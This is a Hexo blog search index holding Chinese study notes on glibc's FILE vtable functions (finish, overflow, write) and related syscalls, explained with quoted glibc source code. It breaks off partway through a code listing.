<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python基础使用</title>
      <link href="/posts/8990/"/>
      <url>/posts/8990/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CS_learn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file虚函数学习</title>
      <link href="/posts/1518/"/>
      <url>/posts/1518/</url>
      
        <content type="html"><![CDATA[<h1 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h1><h2 id="lseek"><a href="#lseek" class="headerlink" title="lseek"></a>lseek</h2><p><code>seek</code> 是一个用于文件操作的系统调用，它的主要功能是用于改变文件指针的位置，从而实现对文件的随机访问。具体来说，<code>seek</code> 的功能包括：</p><ol><li>定位文件指针：<code>seek</code> 允许你将文件指针（读/写位置）移动到文件中的任意位置。这是对文件进行随机访问的关键操作。你可以指定要移动到的位置，通常是相对于文件开头的偏移量。</li><li>读取和写入特定位置：通过改变文件指针的位置，你可以在文件中的任何位置进行读取和写入操作，而不必按照顺序逐个字节进行操作。这对于访问大型文件或数据库非常有用。</li><li>支持文件的随机访问：<code>seek</code> 是实现随机访问的关键，允许你在不必按照文件顺序读取数据的情况下，快速访问和处理文件的各个部分。</li><li>实现文件的截断和扩展：在某些情况下，<code>seek</code> 可以用于截断文件（减小文件大小）或扩展文件（增大文件大小）。通过移动文件指针并写入数据，你可以实现这些操作。</li></ol><p>其返回值表示成功执行操作后的文件偏移量，如果出现错误，返回值会是 <code>-1</code>。</p><p>具体来说，<code>lseek</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>fd</code> 是文件描述符，用于指定要进行定位操作的文件。</li><li><code>offset</code> 是一个偏移量，用于指定要移动的相对位置。可以为正数、负数或零，具体取决于 <code>whence</code> 参数的值。</li><li><code>whence</code> 用于确定偏移量的基准位置，通常可以取以下值之一：<ul><li><code>SEEK_SET</code>：以文件开头为基准，<code>offset</code> 指定的位置。</li><li><code>SEEK_CUR</code>：以当前文件位置为基准，增加 <code>offset</code> 指定的位置。</li><li><code>SEEK_END</code>：以文件末尾为基准，增加 <code>offset</code> 指定的位置。</li></ul></li></ul><p><code>lseek</code> 函数会根据 <code>offset</code> 和 <code>whence</code> 的指定值来移动文件描述符 <code>fd</code> 的偏移位置，并返回新的文件偏移位置。如果操作成功，返回值是新的偏移位置。如果出现错误，返回值是 <code>-1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_set 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_cur 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_end 2</span></span><br></pre></td></tr></table></figure><h2 id="sync"><a href="#sync" class="headerlink" title="sync"></a>sync</h2><p><code>sync</code> 是一个系统调用，它的主要功能是将操作系统内核中尚未写入磁盘的缓冲区数据强制刷新到磁盘上的存储设备，<strong>以确保数据持久性和文件系统的一致性</strong>。<code>sync</code> 的主要功能包括：</p><ol><li>数据持久性：通过执行 <code>sync</code>，操作系统会将所有尚未写入磁盘的数据写入到物理存储设备中。这可以确保即使系统崩溃或断电，尚未写入磁盘的数据也不会丢失。</li><li>文件系统一致性：<code>sync</code> 也有助于维护文件系统的一致性。在写入文件和目录信息时，文件系统通常会维护内部数据结构，这些数据结构需要及时写入磁盘以确保文件系统的一致性。<code>sync</code> 确保这些数据结构及其相关的数据被写入磁盘。</li><li>缓冲区刷新：<code>sync</code> 还用于刷新内核中的缓冲区，以确保缓冲区中的数据被写入磁盘。这对于正在进行的文件操作和文件系统操作非常重要，因为数据通常首先存储在内存中以提高性能，然后定期刷新到磁盘上。</li><li>数据完整性：<code>sync</code> 还有助于维护数据的完整性。它确保了所有写入的数据都已经被持久地存储在磁盘上，以免数据损坏或丢失。</li></ol><h2 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h2><p>系统调用 <code>stat</code> 用于获取关于文件或目录的信息，如文件的大小、访问权限、所属用户和组、文件类型等。它<strong>返回一个包含文件信息的结构体</strong>，通常被称为 <code>struct stat</code>。</p><p><code>stat</code> 系统调用的功能包括：</p><ol><li><p>获取文件的基本属性：<code>stat</code> 可以用来获取文件的基本属性，如文件大小、创建时间、修改时间、访问时间等。</p></li><li><p>获取文件的权限信息：<code>stat</code> 可以提供文件的权限信息，包括文件的拥有者、所属组以及其他用户的权限。</p></li><li><p>确定文件的类型：<code>stat</code> 可以告诉您文件是普通文件、目录、符号链接还是其他类型的文件。</p></li><li><p>获取文件的相关信息：<code>stat</code> 可以提供有关文件系统的信息，如文件系统的块大小、设备号等。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">stat64</span> &#123;</span></span><br><span class="line">  <span class="type">_dev_t</span> st_dev;<span class="comment">//文件所在的设备的标识符</span></span><br><span class="line">  <span class="type">_ino_t</span> st_ino;<span class="comment">//文件的 inode 号</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> st_mode;<span class="comment">//文件的权限和类型信息</span></span><br><span class="line">  <span class="type">short</span> st_nlink;<span class="comment">//文件的硬链接数目</span></span><br><span class="line">  <span class="type">short</span> st_uid;<span class="comment">//文件的用户标识符 (UID)</span></span><br><span class="line">  <span class="type">short</span> st_gid;<span class="comment">//文件的组标识符 (GID)</span></span><br><span class="line">  <span class="type">_dev_t</span> st_rdev;<span class="comment">//特殊文件的设备标识符</span></span><br><span class="line">  __MINGW_EXTENSION __int64 st_size;<span class="comment">//文件的大小，以字节为单位</span></span><br><span class="line">  <span class="type">__time64_t</span> st_atime;<span class="comment">//最后访问时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_mtime;<span class="comment">//最后修改时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_ctime;<span class="comment">//状态改变时间</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他还有用到read,write,open,close都较为熟悉就不记录了</p><h1 id="虚表函数"><a href="#虚表函数" class="headerlink" title="虚表函数"></a>虚表函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_file_jumps)</span><br></pre></td></tr></table></figure><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish的主要功能是关闭缓冲区,解除文件流在_IO_list_all中的链接</p><h3 id="1-IO-new-file-finish"><a href="#1-IO-new-file-finish" class="headerlink" title="1 _IO_new_file_finish"></a>1 _IO_new_file_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><ol><li>先是检查文件是否打开,是则调用_IO_do_flush (fp)并根据 _IO_DELETE_DONT_CLOSE标志位决定是否调用close关闭文件流</li><li>_IO_default_finish (fp, 0);</li></ol><h3 id="2-1-IO-do-flush"><a href="#2-1-IO-do-flush" class="headerlink" title="2-1 _IO_do_flush"></a>2-1 _IO_do_flush</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>根据是是否是宽字节有两个分支</p><p>目前先看非宽字节分支,调用的是另一个虚表函数write,这里先不写</p><h3 id="2-2-IO-default-finish"><a href="#2-2-IO-default-finish" class="headerlink" title="2-2 _IO_default_finish"></a>2-2 _IO_default_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><ol><li>若buf不为空且_IO_USER_BUF标志为0,释放free缓冲区,并置空buf指针</li><li>将文件流的所有marker的_sbuf字段清空</li><li>若文件流的_IO_save_base不为空,则将其free释放并置空</li><li>调用unlink将文件流解除_IO_list_all链</li></ol><h3 id="3-IO-un-link"><a href="#3-IO-un-link" class="headerlink" title="3 _IO_un_link"></a>3 _IO_un_link</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>先确认文件流在_IO_list_all链中</li><li>寻找_IO_list_all链中的fp将其解链并清除_IO_LINKED标志位</li></ol><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p><code>overflow</code> 主要负责将数据写入底层文件(或设备)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><ol><li>判断文件流是否设置_IO_NO_WRITES,是则标记错误并返回</li><li><ul><li>如果文件不处于写入模式(_IO_CURRENTLY_PUTTING)或者_IO_write_base为空<ul><li>如果是_IO_write_base为空的情况,先通过_IO_doallocbuf申请buf缓冲区,并设置read指针</li><li>如果文件流正在备份(_IO_IN_BACKUP)<ul><li>调用_IO_free_backup_area (f)</li><li>f-&gt;_IO_read_base减去f-&gt;_IO_read_end - f-&gt;_IO_read_ptr和f-&gt;_IO_read_base - f-&gt;_IO_buf_base中更小的那个</li><li>f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</li></ul></li><li>如果f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end,将f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</li><li>将w-ptr和w-base设置为r-ptr,w-end设置为b-end,r-base和r-ptr设置为r-end(之后这些指针一般用简写)</li><li>设置_IO_CURRENTLY_PUTTING位</li><li>若文件流是行缓冲或无缓冲模式且非宽字符w-end=w-ptr</li></ul></li></ul></li><li>如果参数ch为EOF,调用_IO_do_write</li><li>如果w-ptr==b-end,调用_IO_do_flush如果返回EOF则直接return EOF</li><li>*f-&gt;_IO_write_ptr++=ch</li><li>如果文件是无缓冲或者是行缓冲且ch为’\n’,调用_IO_do_write如果返回EOF则直接return EOF</li><li>返回ch</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><p>如果to_do==0直接返回1</p><p>否则调用new_do_write (fp, data, to_do)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span 